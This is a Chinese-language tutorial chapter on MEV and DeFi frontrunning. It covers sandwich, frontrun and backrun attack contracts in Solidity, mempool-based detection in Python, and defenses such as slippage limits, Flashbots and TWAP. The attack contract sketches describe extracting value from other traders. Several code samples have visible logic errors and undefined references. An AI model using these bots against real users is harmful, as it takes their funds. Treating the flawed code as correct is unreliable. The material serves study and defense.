# MEV 与 DeFi 抢跑攻击

## 概述

MEV (Maximal Extractable Value，最大可提取价值) 是区块链独有的安全威胁。矿工/验证者通过重新排序、插入或审查区块内的交易来提取额外利润。2020-2024年间，MEV 已造成超过 10 亿美元的损失。

---

## 1. MEV 攻击类型

### 1.1 三明治攻击 (Sandwich Attack)

```
正常交易流:
  User: Swap 10 ETH → USDC
  预期: 10 ETH → 20,000 USDC

三明治攻击流:
  1. 攻击者: Swap 100 ETH → USDC (前端运行 Frontrun)
     → USDC 价格上涨
  2. User:    Swap 10 ETH → USDC (受害者交易)
     → 获得 19,500 USDC (损失 500 USDC)
  3. 攻击者: Swap USDC → 100 ETH (后端运行 Backrun)
     → USDC 价格回落到正常
     → 攻击者赚取: 500 USDC - Gas 费用
```

```solidity
// 三明治攻击合约
contract SandwichBot {
    IUniswapV2Router public router;
    IERC20 public WETH;

    constructor(address _router, address _weth) {
        router = IUniswapV2Router(_router);
        WETH = IERC20(_weth);
    }

    function executeSandwich(
        address token,
        uint256 victimAmount,
        uint256 frontrunAmount
    ) external {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = token;

        // 1. 前端运行: 买入大量代币推高价格
        router.swapExactETHForTokens{value: frontrunAmount}(
            victimAmount * 95 / 100,  // 预期最小输出
            path,
            address(this),
            block.timestamp + 300
        );

        // 受害者交易在这里执行 (被夹在中间)

        // 3. 后端运行: 卖出代币回到原价
        address[] memory reverse_path = new address[](2);
        reverse_path[0] = token;
        reverse_path[1] = address(WETH);

        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).approve(address(router), balance);

        router.swapExactTokensForETH(
            balance,
            0,  // 接受任何数量的 ETH (利润)
            reverse_path,
            address(this),
            block.timestamp + 300
        );
    }
}
```

### 1.2 抢跑攻击 (Frontrunning)

```solidity
// 抢跑清算攻击
contract LiquidationFrontrunner {
    function frontrunLiquidation(
        address lendingPool,
        address collateral,
        address debt,
        address user,
        uint256 debtToCover
    ) external {
        // 1. 监控内存池中的清算交易
        // 2. 复制清算交易并使用更高 Gas 价格
        // 3. 抢先执行清算，获取清算奖励

        // 执行清算
        ILendingPool(lendingPool).liquidationCall(
            collateral,
            debt,
            user,
            debtToCover,
            false  // 不接收 aToken
        );

        // 获得清算奖励 (通常是 5-10% 的抵押品)
    }
}
```

### 1.3 Backrunning (后运行)

```solidity
// Arbitrage Backrunner
contract ArbitrageBot {
    function backrunArbitrage(
        address[] memory pools,
        address tokenA,
        address tokenB
    ) external {
        // 在大型 swap 之后立即执行套利
        // 利用不同池中的瞬时价格差异

        uint256 profit = 0;
        for (uint256 i = 0; i < pools.length - 1; i++) {
            profit += executeArbitrage(
                pools[i],
                pools[i + 1],
                tokenA,
                tokenB
            );
        }

        require(profit > 0, "No profit");
    }
}
```

---

## 2. MEV 检测与监控

### 2.1 内存池监控

```python
from web3 import Web3
import asyncio
from hexbytes import HexBytes

class MempoolMonitor:
    """Ethereum 内存池监控"""

    def __init__(self, wss_url):
        self.w3 = Web3(Web3.WebsocketProvider(wss_url))
        self.sandwich_patterns = []

    async def monitor_pending_txs(self):
        """监控待处理交易"""
        self.w3.eth.filter('pending')

        async def handle_tx(tx_hash):
            tx = self.w3.eth.get_transaction(tx_hash)

            # 检测三明治攻击模式
            if self._is_sandwich_attack(tx):
                self.alert_sandwich(tx)

        # WebSocket 订阅
        subscription = await self.w3.eth.subscribe('pendingTransactions')
        async for tx_hash in subscription:
            await handle_tx(tx_hash)

    def _is_sandwich_attack(self, tx):
        """三明治攻击检测"""
        # 特征1: 高 Gas 价格 (> 平均的 5 倍)
        if tx['gasPrice'] > self.avg_gas_price * 5:
            # 特征2: 调用已知 DEX 路由
            if self._is_dex_swap(tx):
                # 特征3: 短时间内同一地址的买入+卖出
                if self._has_buy_sell_pattern(tx['from']):
                    return True
        return False

    def detect_sandwich(self, block_number):
        """检测已完成的三明治攻击"""
        block = self.w3.eth.get_block(block_number, full_transactions=True)

        transactions = block['transactions']
        for i in range(len(transactions) - 2):
            tx1 = transactions[i]    # 前端运行
            tx2 = transactions[i+1]  # 受害者
            tx3 = transactions[i+2]  # 后端运行

            if (tx1['from'] == tx3['from']       # 同一攻击者
                and tx1['from'] != tx2['from']    # 与受害者不同
                and self._is_dex_swap(tx1)        # 都是 Swap
                and self._is_dex_swap(tx2)
                and self._is_dex_swap(tx3)
                and tx1['gasPrice'] > tx2['gasPrice']  # 更高 Gas
                and tx3['gasPrice'] > tx2['gasPrice']):
                return {
                    'type': 'sandwich',
                    'victim': tx2['from'],
                    'attacker': tx1['from'],
                    'block': block_number
                }
```

### 2.2 MEV 仪表盘

```python
import matplotlib.pyplot as plt
from collections import defaultdict

class MEVAnalytics:
    def __init__(self, w3_provider):
        self.w3 = Web3(Web3.HTTPProvider(w3_provider))

    def analyze_mev_distribution(self, start_block, end_block):
        """分析 MEV 提取分布"""
        mev_data = {
            'sandwich': {'count': 0, 'profit_eth': 0},
            'frontrun': {'count': 0, 'profit_eth': 0},
            'arbitrage': {'count': 0, 'profit_eth': 0},
            'liquidation': {'count': 0, 'profit_eth': 0}
        }

        for block_num in range(start_block, end_block + 1):
            block = self.w3.eth.get_block(block_num, True)

            for tx in block['transactions']:
                # 调用分析函数（需内部 trace）
                mev_type = self._classify_mev(tx)
                if mev_type:
                    mev_data[mev_type]['count'] += 1

        return mev_data

    def generate_report(self, mev_data):
        """生成 MEV 分析报告"""
        print("=== MEV 活动报告 ===\n")
        total_mev = sum(v['profit_eth'] for v in mev_data.values())

        for mev_type, data in mev_data.items():
            print(f"{mev_type}:")
            print(f"  次数: {data['count']}")
            print(f"  利润: {data['profit_eth']:.2f} ETH")
            print()
```

---

## 3. MEV 防御

### 3.1 滑点保护

```solidity
// ✅ 严格滑点保护
function safeSwap(
    address tokenIn,
    address tokenOut,
    uint256 amountIn,
    uint256 minAmountOut,  // 最小接受输出
    uint256 deadline
) external {
    require(minAmountOut > 0, "Slippage must be set");

    // 使用 0.1% 滑点 = 99.9% 预期输出
    // 不是 amountOutMinimum = 0
    uint256 expectedOut = getExpectedOutput(tokenIn, tokenOut, amountIn);
    require(minAmountOut >= expectedOut * 995 / 1000, "Slippage too high");

    router.swapExactTokensForTokens(
        amountIn,
        minAmountOut,
        path,
        msg.sender,
        deadline
    );
}
```

### 3.2 使用 Flashbots 保护

```python
from flashbots import flashbot
from eth_account import Account

class FlashbotsProtection:
    """通过 Flashbots 发送交易避免 MEV"""

    def __init__(self, private_key, rpc_url):
        self.account = Account.from_key(private_key)
        self.flashbot = flashbot(self.account)

    def send_protected_transaction(self, tx):
        """
        通过 Flashbots 中继发送交易
        - 交易不会出现在公共内存池
        - 避免被 Frontrun
        - 如果不在链上则无需支付 Gas
        """

        # 打包为 bundle
        bundle = [
            {'signed_transaction': tx.rawTransaction}
        ]

        # 发送到 Flashbots
        block_number = self.w3.eth.block_number
        result = self.flashbot.send_bundle(
            bundle,
            target_block_number=block_number + 5
        )

        return result

    def cancel_stuck_transactions(self):
        """
        使用 Flashbots 取消卡住的交易
        （比公共内存池的取消方法更好，不会被狙击）
        """
        nonce = self.w3.eth.get_transaction_count(self.account.address)

        cancel_tx = {
            'to': self.account.address,  # 发送给自己
            'value': 0,
            'gas': 21000,
            'nonce': nonce - 1,  # 替换卡住的交易
            # 留空 data 来取消
        }
```

### 3.3 时间加权平均价格 (TWAP)

```solidity
// ✅ 使用 TWAP 防止闪电贷价格操纵
contract TWAPOracle {
    using FixedPoint for *;

    function consult(
        address token,
        uint256 amountIn
    ) external view returns (uint256 amountOut) {
        // 使用 30 分钟 TWAP 而非实时价格
        (uint256 price0Cumulative, uint256 price1Cumulative, uint32 blockTimestamp) =
            UniswapV2OracleLibrary.currentCumulativePrices(token);

        uint256 timeElapsed = block.timestamp - referenceTimestamp;
        uint256 priceAverage = (price0Cumulative - referencePrice0) / timeElapsed;

        return (amountIn * priceAverage) / FixedPoint.Q112;
    }
}
```

---

## 4. 实战工具

### 4.1 MEV 开发工具包

```bash
# MEV-Inspect - 历史 MEV 分析
git clone https://github.com/flashbots/mev-inspect-rs
cd mev-inspect-rs && cargo build --release

# 分析特定区块的 MEV
./target/release/mev-inspect -b 15000000 -b 15001000

# Foundry - MEV 测试框架
forge test --match-test testSandwich -vvv

# MEV-Share - Flashbots 交易共享
curl https://relay.flashbots.net
```

### 4.2 MEV 防护检查清单

```yaml
MEV 防护清单:
  DEX 用户:
    - [ ] 设置合理滑点 (0.1-0.5%)
    - [ ] 使用 Flashbots RPC 发送交易
    - [ ] 分批大额交易 (< 总流动性的 1%)
    - [ ] 使用聚合器 (1inch, Matcha) 获得最优价格

  协议开发者:
    - [ ] 使用 TWAP 而非实时价格
    - [ ] 实现 commit-reveal 机制
    - [ ] 添加交易截止时间 (deadline)
    - [ ] 审计闪电贷攻击向量

  验证者/节点:
    - [ ] 使用 MEV-Boost 公平分配
    - [ ] 不参与恶意 MEV 提取
    - [ ] 透明化 MEV 策略
```

---

## 参考资源

- [Flashbots Research](https://docs.flashbots.net/)
- [EigenPhi MEV 数据](https://eigenphi.io/)
- [MEV-Explore](https://explore.flashbots.net/)
- [Ethereum.org MEV 指南](https://ethereum.org/en/developers/docs/mev/)

---

*上一篇：[DeFi 安全与审计](./02-defi-security.md)*
